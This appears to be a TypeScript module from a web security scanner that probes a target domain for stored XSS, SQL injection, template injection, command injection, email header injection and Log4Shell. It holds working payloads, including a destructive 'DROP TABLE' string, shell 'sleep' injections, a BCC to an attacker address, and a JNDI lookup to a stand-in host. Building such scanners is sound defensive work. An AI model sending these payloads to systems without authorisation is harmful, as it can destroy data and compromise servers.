import * as https from 'https';
import * as http from 'http';
import { ScanResult, Finding, Severity } from '../../types';
import { generateFinding } from './shared';

const REQUEST_TIMEOUT_MS = 5000;

interface RequestOptions {
  method: string;
  headers: Record<string, string>;
  body?: string;
  timeoutMs?: number;
}

interface RequestResult {
  statusCode: number;
  body: string;
  durationMs: number;
  error?: string;
}

function makeRequest(
  url: string,
  options: RequestOptions
): Promise<RequestResult> {
  return new Promise((resolve) => {
    const start = Date.now();
    const parsed = new URL(url);
    const isHttps = parsed.protocol === 'https:';
    const lib = isHttps ? https : http;

    const reqHeaders: Record<string, string> = {
      'Content-Type': 'application/json',
      Accept: 'application/json, text/html, */*',
      ...(options.headers as Record<string, string> || {}),
    };
    if (options.body) {
      reqHeaders['Content-Length'] = Buffer.byteLength(options.body).toString();
    }
    const reqOptions = {
      hostname: parsed.hostname,
      port: parsed.port
        ? parseInt(parsed.port, 10)
        : isHttps
        ? 443
        : 80,
      path: parsed.pathname + parsed.search,
      method: options.method,
      headers: reqHeaders,
      rejectUnauthorized: false,
    } as http.RequestOptions & { rejectUnauthorized?: boolean };

    const timeout = options.timeoutMs ?? REQUEST_TIMEOUT_MS;
    let settled = false;
    const chunks: Buffer[] = [];

    const req = lib.request(reqOptions, (res) => {
      res.on('data', (chunk) => chunks.push(Buffer.from(chunk)));
      res.on('end', () => {
        if (settled) return;
        settled = true;
        resolve({
          statusCode: res.statusCode ?? 0,
          body: Buffer.concat(chunks).toString('utf8'),
          durationMs: Date.now() - start,
        });
      });
    });

    req.setTimeout(timeout, () => {
      if (settled) return;
      settled = true;
      req.destroy();
      resolve({
        statusCode: 0,
        body: '',
        durationMs: Date.now() - start,
        error: 'timeout',
      });
    });

    req.on('error', (err) => {
      if (settled) return;
      settled = true;
      resolve({
        statusCode: 0,
        body: '',
        durationMs: Date.now() - start,
        error: err.message,
      });
    });

    if (options.body) req.write(options.body);
    req.end();
  });
}

function baseUrl(domain: string): string {
  const d = domain.replace(/\/+$/, '');
  return d.startsWith('http://') || d.startsWith('https://')
    ? d
    : `https://${d}`;
}

const SQL_ERROR_PATTERNS = [
  /sql syntax/i,
  /mysql_fetch/i,
  /ORA-\d{5}/,
  /pg_query/i,
  /sqlite_/i,
  /syntax error.*sql/i,
  /unclosed quotation mark/i,
  /quoted string not properly terminated/i,
  /microsoft ole db provider for sql server/i,
  /SQLSTATE\[/i,
  /Warning: mysql_/i,
  /PDOException/i,
  /QueryException/i,
  /SqlException/i,
];

function containsSqlError(body: string): boolean {
  return SQL_ERROR_PATTERNS.some((re) => re.test(body));
}

const WRITE_ENDPOINTS = [
  '/api/register',
  '/api/users',
  '/api/profile',
  '/api/comments',
  '/api/feedback',
  '/api/messages',
  '/api/posts',
  '/api/reviews',
];

const READ_ENDPOINTS: Record<string, string> = {
  '/api/register': '/api/users/me',
  '/api/users': '/api/users/me',
  '/api/profile': '/api/profile',
  '/api/comments': '/api/comments',
  '/api/feedback': '/api/feedback',
  '/api/messages': '/api/messages',
  '/api/posts': '/api/posts',
  '/api/reviews': '/api/reviews',
};

// Payload field names to try per endpoint
const ENDPOINT_FIELDS: Record<string, string[]> = {
  '/api/register': ['username', 'name', 'displayName'],
  '/api/users': ['username', 'name', 'displayName'],
  '/api/profile': ['bio', 'name', 'description', 'about'],
  '/api/comments': ['body', 'content', 'text', 'comment'],
  '/api/feedback': ['message', 'body', 'content', 'feedback'],
  '/api/messages': ['body', 'content', 'text', 'message'],
  '/api/posts': ['title', 'body', 'content'],
  '/api/reviews': ['body', 'content', 'text', 'review'],
};

export async function runSecondOrderInjectionScan(
  domain: string
): Promise<ScanResult> {
  const startTime = Date.now();
  const findings: Finding[] = [];
  const errors: string[] = [];
  const base = baseUrl(domain);
  const ts = Date.now();
  const marker = `CYBERGUARD_SOI_${ts}`;

  // ------------------------------------------------------------------
  // A) STORED XSS
  // ------------------------------------------------------------------
  const xssPayloads = [
    `<img src=x onerror=alert('${marker}')>`,
    `<script>${marker}_XSS</script>`,
  ];

  for (const endpoint of WRITE_ENDPOINTS) {
    const fields = ENDPOINT_FIELDS[endpoint] ?? ['body'];
    for (const field of fields) {
      for (const payload of xssPayloads) {
        const body = JSON.stringify({ [field]: payload, email: `probe_${ts}@cyberguard.invalid`, password: 'Probe123!' });
        let createdId: string | undefined;
        try {
          const post = await makeRequest(`${base}${endpoint}`, {
            method: 'POST',
            headers: { 'X-CyberGuard-Probe': marker },
            body,
          });

          if (post.error) continue;

          // Try to extract created resource ID from response
          try {
            const parsed = JSON.parse(post.body);
            createdId = parsed?.id ?? parsed?.data?.id ?? parsed?._id ?? undefined;
          } catch {
            // ignore parse errors
          }

          // GET to check if payload was stored unescaped
          const readPath = READ_ENDPOINTS[endpoint] ?? endpoint;
          const getUrl = createdId
            ? `${base}${readPath}/${createdId}`
            : `${base}${readPath}`;

          const get = await makeRequest(getUrl, {
            method: 'GET',
            headers: { 'X-CyberGuard-Probe': marker },
          });

          if (!get.error && get.body.includes(payload)) {
            findings.push(
              generateFinding({
                title: 'Stored Cross-Site Scripting (Stored XSS)',
                severity: Severity.CRITICAL,
                affectedAsset: endpoint,
                category: 'Second-Order Injection',
                description: `Stored XSS payload found unescaped in response from ${readPath}. ` +
                  `Submitted payload via field '${field}' to ${endpoint}; retrieved from ${readPath}. ` +
                  `Payload: ${payload.substring(0, 80)}`,
                evidence: `Stored XSS payload found unescaped in response from ${readPath}. ` +
                  `Submitted payload via field '${field}' to ${endpoint}; retrieved from ${readPath}. ` +
                  `Payload: ${payload.substring(0, 80)}`,
                impact: 'Attackers can execute arbitrary JavaScript in victims browsers, leading to session hijacking, credential theft, or malicious redirects.',
                remediation: 'Sanitize and HTML-encode all user-supplied data before storing and rendering. ' +
                  'Implement a strict Content Security Policy.',
                references: [],
              })
            );
          }
        } catch (err: any) {
          errors.push(`StoredXSS ${endpoint}/${field}: ${err?.message ?? err}`);
        }

        // Cleanup
        if (createdId) {
          try {
            await makeRequest(`${base}${endpoint}/${createdId}`, {
              method: 'DELETE',
              headers: { 'X-CyberGuard-Probe': marker },
            });
          } catch {
            // best-effort
          }
        }
      }
    }
  }

  // ------------------------------------------------------------------
  // B) STORED SQL INJECTION
  // ------------------------------------------------------------------
  const sqlPayloads: Record<string, string> = {
    username: `test_${ts}' OR '1'='1`,
    email: `inject_${ts}'@example.com`,
    bio: `'; DROP TABLE users; --`,
    body: `'; SELECT * FROM information_schema.tables; --`,
  };

  for (const endpoint of WRITE_ENDPOINTS) {
    const fields = ENDPOINT_FIELDS[endpoint] ?? ['body'];
    for (const field of fields) {
      const payload = sqlPayloads[field] ?? `'; DROP TABLE ${field}s; --`;
      let createdId: string | undefined;
      try {
        const post = await makeRequest(`${base}${endpoint}`, {
          method: 'POST',
          headers: { 'X-CyberGuard-Probe': marker },
          body: JSON.stringify({
            [field]: payload,
            email: `sqlinject_${ts}@cyberguard.invalid`,
            password: 'Probe123!',
          }),
        });

        if (post.error) continue;

        try {
          const parsed = JSON.parse(post.body);
          createdId = parsed?.id ?? parsed?.data?.id ?? parsed?._id;
        } catch {
          // ignore
        }

        const readPath = READ_ENDPOINTS[endpoint] ?? endpoint;
        const getUrl = createdId
          ? `${base}${readPath}/${createdId}`
          : `${base}${readPath}`;

        const get = await makeRequest(getUrl, {
          method: 'GET',
          headers: { 'X-CyberGuard-Probe': marker },
        });

        if (!get.error && containsSqlError(get.body)) {
          findings.push(
            generateFinding({
              title: 'Stored SQL Injection',
              severity: Severity.CRITICAL,
              affectedAsset: endpoint,
              category: 'Second-Order Injection',
              description: `SQL error pattern detected in response from ${readPath} after storing SQL payload ` +
                `via field '${field}' on ${endpoint}. Payload: ${payload.substring(0, 80)}`,
              evidence: `SQL error pattern detected in response from ${readPath} after storing SQL payload ` +
                `via field '${field}' on ${endpoint}. Payload: ${payload.substring(0, 80)}`,
              impact: 'Attackers can execute arbitrary SQL queries, potentially accessing, modifying, or deleting all data in the database.',
              remediation: 'Use parameterized queries / prepared statements for all database interactions. ' +
                'Never concatenate user input into SQL strings.',
              references: [],
            })
          );
        }
      } catch (err: any) {
        errors.push(`StoredSQLi ${endpoint}/${field}: ${err?.message ?? err}`);
      }

      if (createdId) {
        try {
          await makeRequest(`${base}${endpoint}/${createdId}`, {
            method: 'DELETE',
            headers: { 'X-CyberGuard-Probe': marker },
          });
        } catch {
          // best-effort
        }
      }
    }
  }

  // ------------------------------------------------------------------
  // C) STORED SSTI
  // ------------------------------------------------------------------
  const sstiPayloads = [`{{7*7}}`, `\${7*7}`, `<%= 7*7 %>`, `#{7*7}`];

  for (const endpoint of WRITE_ENDPOINTS) {
    const fields = ENDPOINT_FIELDS[endpoint] ?? ['body'];
    for (const field of fields) {
      for (const payload of sstiPayloads) {
        let createdId: string | undefined;
        try {
          const post = await makeRequest(`${base}${endpoint}`, {
            method: 'POST',
            headers: { 'X-CyberGuard-Probe': marker },
            body: JSON.stringify({
              [field]: `${marker}_SSTI_${payload}`,
              email: `ssti_${ts}@cyberguard.invalid`,
              password: 'Probe123!',
            }),
          });

          if (post.error) continue;

          try {
            const parsed = JSON.parse(post.body);
            createdId = parsed?.id ?? parsed?.data?.id ?? parsed?._id;
          } catch {
            // ignore
          }

          const readPath = READ_ENDPOINTS[endpoint] ?? endpoint;
          const getUrl = createdId
            ? `${base}${readPath}/${createdId}`
            : `${base}${readPath}`;

          const get = await makeRequest(getUrl, {
            method: 'GET',
            headers: { 'X-CyberGuard-Probe': marker },
          });

          // Check if template was evaluated: 7*7=49
          if (
            !get.error &&
            get.body.includes(`${marker}_SSTI_`) &&
            get.body.includes('49') &&
            !get.body.includes(payload)
          ) {
            findings.push(
              generateFinding({
                title: 'Stored Server-Side Template Injection (SSTI)',
                severity: Severity.CRITICAL,
                affectedAsset: endpoint,
                category: 'Second-Order Injection',
                description: `Template expression ${payload} was evaluated server-side (result '49' found) ` +
                  `when stored via field '${field}' on ${endpoint} and retrieved from ${readPath}. ` +
                  `This indicates server-side template execution of user input.`,
                evidence: `Template expression ${payload} was evaluated server-side (result '49' found) ` +
                  `when stored via field '${field}' on ${endpoint} and retrieved from ${readPath}. ` +
                  `This indicates server-side template execution of user input.`,
                impact: 'Attackers can execute arbitrary server-side code, potentially leading to remote code execution or full server compromise.',
                remediation: 'Never pass user input directly to template engines. Treat all user data as literals, ' +
                  'not as template expressions. Use sandboxed template environments if dynamic templates are required.',
                references: [],
              })
            );
          }
        } catch (err: any) {
          errors.push(`StoredSSTI ${endpoint}/${field}: ${err?.message ?? err}`);
        }

        if (createdId) {
          try {
            await makeRequest(`${base}${endpoint}/${createdId}`, {
              method: 'DELETE',
              headers: { 'X-CyberGuard-Probe': marker },
            });
          } catch {
            // best-effort
          }
        }
      }
    }
  }

  // ------------------------------------------------------------------
  // D) STORED COMMAND INJECTION (timing-based)
  // ------------------------------------------------------------------
  const cmdPayloads = [`; sleep 5 #`, `| sleep 5`, `&& sleep 5`, `$(sleep 5)`];

  for (const endpoint of WRITE_ENDPOINTS) {
    const fields = ENDPOINT_FIELDS[endpoint] ?? ['body'];
    for (const field of fields.slice(0, 1)) {
      // Limit to first field to keep test count manageable
      for (const payload of cmdPayloads) {
        let createdId: string | undefined;
        try {
          // Baseline GET timing
          const readPath = READ_ENDPOINTS[endpoint] ?? endpoint;
          const baseline = await makeRequest(`${base}${readPath}`, {
            method: 'GET',
            headers: {},
            timeoutMs: REQUEST_TIMEOUT_MS,
          });
          const baselineDuration = baseline.durationMs;

          const post = await makeRequest(`${base}${endpoint}`, {
            method: 'POST',
            headers: { 'X-CyberGuard-Probe': marker },
            body: JSON.stringify({
              [field]: `${marker}_CMD_${payload}`,
              email: `cmdinject_${ts}@cyberguard.invalid`,
              password: 'Probe123!',
            }),
          });

          if (post.error) continue;

          try {
            const parsed = JSON.parse(post.body);
            createdId = parsed?.id ?? parsed?.data?.id ?? parsed?._id;
          } catch {
            // ignore
          }

          const getUrl = createdId
            ? `${base}${readPath}/${createdId}`
            : `${base}${readPath}`;

          const get = await makeRequest(getUrl, {
            method: 'GET',
            headers: { 'X-CyberGuard-Probe': marker },
            timeoutMs: 10000, // extended timeout to detect sleep
          });

          const delay = get.durationMs - baselineDuration;
          if (!get.error && delay > 4000) {
            findings.push(
              generateFinding({
                title: 'Stored Command Injection (Timing)',
                severity: Severity.CRITICAL,
                affectedAsset: endpoint,
                category: 'Second-Order Injection',
                description: `Possible stored command injection detected on ${endpoint} via field '${field}'. ` +
                  `GET of stored resource took ${get.durationMs}ms vs baseline ${baselineDuration}ms ` +
                  `(delta: ${delay}ms > 4000ms threshold). Payload: ${payload}`,
                evidence: `Possible stored command injection detected on ${endpoint} via field '${field}'. ` +
                  `GET of stored resource took ${get.durationMs}ms vs baseline ${baselineDuration}ms ` +
                  `(delta: ${delay}ms > 4000ms threshold). Payload: ${payload}`,
                impact: 'Attackers can execute arbitrary operating system commands, potentially taking full control of the server.',
                remediation: 'Never pass user-supplied input to shell commands or system calls. ' +
                  'Use language-native APIs instead of shell execution. ' +
                  'If shell calls are unavoidable, use strict allowlists and escape all arguments.',
                references: [],
              })
            );
          }
        } catch (err: any) {
          errors.push(`StoredCMD ${endpoint}/${field}: ${err?.message ?? err}`);
        }

        if (createdId) {
          try {
            await makeRequest(`${base}${endpoint}/${createdId}`, {
              method: 'DELETE',
              headers: { 'X-CyberGuard-Probe': marker },
            });
          } catch {
            // best-effort
          }
        }
      }
    }
  }

  // ------------------------------------------------------------------
  // E) HTML INJECTION / EMAIL HEADER INJECTION
  // ------------------------------------------------------------------
  const emailInjectionPayloads = [
    `victim_${ts}@example.com\r\nBCC:attacker@evil.com`,
    `victim_${ts}@example.com\r\nCC:attacker@evil.com`,
    `victim_${ts}@example.com%0d%0aBCC:attacker@evil.com`,
  ];

  const emailEndpoints = ['/api/register', '/api/users', '/api/feedback', '/api/messages'];
  for (const endpoint of emailEndpoints) {
    for (const payload of emailInjectionPayloads) {
      try {
        const post = await makeRequest(`${base}${endpoint}`, {
          method: 'POST',
          headers: { 'X-CyberGuard-Probe': marker },
          body: JSON.stringify({
            email: payload,
            username: `probe_${ts}`,
            password: 'Probe123!',
            subject: `Test ${ts}`,
            body: `Email injection test ${marker}`,
          }),
        });

        // A 2xx without sanitization error is suspicious
        if (
          !post.error &&
          post.statusCode >= 200 &&
          post.statusCode < 300
        ) {
          findings.push(
            generateFinding({
              title: 'Email Header Injection',
              severity: Severity.MEDIUM,
              affectedAsset: endpoint,
              category: 'Second-Order Injection',
              description: `Email header injection payload accepted without error on ${endpoint} ` +
                `(HTTP ${post.statusCode}). Payload contained CRLF sequences targeting BCC/CC headers. ` +
                `If the application sends emails using this field, attackers may inject arbitrary headers.`,
              evidence: `Email header injection payload accepted without error on ${endpoint} ` +
                `(HTTP ${post.statusCode}). Payload contained CRLF sequences targeting BCC/CC headers. ` +
                `If the application sends emails using this field, attackers may inject arbitrary headers.`,
              impact: 'Attackers can send unauthorized emails to arbitrary recipients, potentially leading to email spam, phishing campaigns, or information disclosure.',
              remediation: 'Validate and reject email addresses containing CRLF (\\r\\n) or %0d%0a sequences. ' +
                'Use well-tested email libraries that strip header injection sequences automatically.',
              references: [],
            })
          );
        }
      } catch (err: any) {
        errors.push(`EmailInject ${endpoint}: ${err?.message ?? err}`);
      }
    }
  }

  // ------------------------------------------------------------------
  // F) LOG4SHELL / JNDI INJECTION
  // ------------------------------------------------------------------
  const jndiPayload = `\${jndi:ldap://cyberguard-probe.invalid/${marker}}`;
  const jndiHeaders: Record<string, string> = {
    'User-Agent': jndiPayload,
    'X-Forwarded-For': jndiPayload,
    'X-Api-Version': jndiPayload,
    Referer: jndiPayload,
    Origin: `https://cyberguard-probe.invalid/${marker}`,
  };

  const jndiEndpoints = [
    '/api/register',
    '/api/users',
    '/api/profile',
    '/api/comments',
  ];

  for (const endpoint of jndiEndpoints) {
    try {
      const post = await makeRequest(`${base}${endpoint}`, {
        method: 'POST',
        headers: {
          ...jndiHeaders,
          'X-CyberGuard-Probe': marker,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username: jndiPayload,
          email: `log4shell_${ts}@cyberguard.invalid`,
          password: 'Probe123!',
        }),
      });

      // A 500 error may indicate the server attempted JNDI lookup and failed
      if (!post.error && post.statusCode === 500) {
        findings.push(
          generateFinding({
            title: 'Potential Log4Shell / JNDI Injection Vector',
            severity: Severity.HIGH,
            affectedAsset: endpoint,
            category: 'Second-Order Injection',
            description: `Server returned HTTP 500 when JNDI payload was submitted to ${endpoint} ` +
              `via User-Agent, X-Forwarded-For, and request body. ` +
              `A 500 may indicate the server attempted to resolve the JNDI URI and failed. ` +
              `Payload: ${jndiPayload}. ` +
              `NOTE: Definitive confirmation requires out-of-band (OOB) callback detection.`,
            evidence: `Server returned HTTP 500 when JNDI payload was submitted to ${endpoint} ` +
              `via User-Agent, X-Forwarded-For, and request body. ` +
              `A 500 may indicate the server attempted to resolve the JNDI URI and failed. ` +
              `Payload: ${jndiPayload}. ` +
              `NOTE: Definitive confirmation requires out-of-band (OOB) callback detection.`,
            impact: 'Attackers can execute arbitrary remote code on the server via JNDI lookup, potentially leading to full system compromise.',
            remediation: 'Upgrade Log4j to 2.17.1+ (Java 8), 2.12.4+ (Java 7), or 2.3.2+ (Java 6). ' +
              'Set log4j2.formatMsgNoLookups=true as an interim mitigation. ' +
              'Block outbound LDAP/RMI traffic at the network perimeter.',
            references: [],
          })
        );
      }
    } catch (err: any) {
      errors.push(`Log4Shell ${endpoint}: ${err?.message ?? err}`);
    }
  }

  const duration = Date.now() - startTime;

  return {
    module: 'secondOrderInjection' as any,
    findings,
    duration,
    errors,
  };
}
